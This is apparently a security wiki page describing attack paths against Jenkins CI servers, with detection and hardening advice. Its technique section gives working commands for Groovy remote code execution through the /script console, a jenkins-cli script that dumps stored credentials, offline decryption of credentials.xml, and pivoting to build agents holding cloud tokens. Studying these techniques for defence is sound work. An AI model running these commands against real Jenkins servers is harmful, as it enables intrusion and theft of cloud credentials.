---
title: Jenkins Attack Paths — Script Console to Master Key
slug: jenkins-attacks
---

> **TL;DR:** Exposed Jenkins controllers leak Groovy RCE via `/script`, decryptable `credentials.xml`, and build-node pivots that turn one weak controller into multi-cloud compromise.

## What it is
Jenkins is the canonical CI orchestrator and a chronic source of breaches: misconfigured anonymous access, weak agent-to-controller auth, and reversible secret storage. Real incidents include Codecov-adjacent CI raids and the 2023 Confluence-Jenkins chain at multiple SaaS vendors where a Groovy one-liner exfiltrated cloud keys.

## Preconditions / where it applies
- Jenkins controller reachable on 8080/8443 with anonymous "Overall/Read" or "Overall/Administer"
- Or low-priv user with "Job/Configure" on a freestyle/pipeline job
- Filesystem read of `$JENKINS_HOME` (via RCE, backup leak, or container escape) for offline credential decryption

## Technique
Anonymous Groovy console RCE when `/script` is exposed:

```bash
curl -u anon: -X POST "https://jenkins.target.tld/script" \
  --data-urlencode 'script=println "id".execute().text'
```

Authenticated abuse via `jenkins-cli` over JNLP/HTTP:

```bash
curl -O https://jenkins.target.tld/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s https://jenkins.target.tld/ \
  -auth user:apitoken groovy = <<'EOF'
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.Credentials.class)
creds.each { println "${it.id} :: ${it.properties}" }
EOF
```

Offline decryption from a stolen `$JENKINS_HOME`:

```bash
# Combine master.key + hudson.util.Secret to recover AES key, then decrypt
python3 jenkins_decrypt.py \
  --master secrets/master.key \
  --secret secrets/hudson.util.Secret \
  --creds  credentials.xml
```

Build-node pivot: schedule a job pinned to a labelled agent (`agent { label 'prod-deploy' }`) so the controller hands you a shell on a node that already holds AWS instance-role or kube service-account tokens.

## Detection and defence
- Disable `/script` for non-admins; set `hudson.model.DirectoryBrowserSupport.CSP` and remove anonymous "Overall/Read"
- Force matrix auth, SSO (SAML/OIDC), and per-folder credential scoping; rotate `master.key` on suspicion
- Ship `audit-trail` plugin logs and Groovy execution events to SIEM; alert on `RunScriptCommand` and `lookupCredentials` calls
- Use ephemeral agents (Kubernetes plugin) so node compromise dies with the pod; bind cloud creds via OIDC, not static tokens

## References
- [Jenkins Security Advisories](https://www.jenkins.io/security/advisories/) — canonical CVE feed
- [Jenkins Hardening Guide](https://www.jenkins.io/doc/book/security/) — official baseline

See also: [[ci-cd-as-cloud-attack-surface]], [[gha-oidc-sub-claim-wildcards]], [[terraform-state-extraction]].
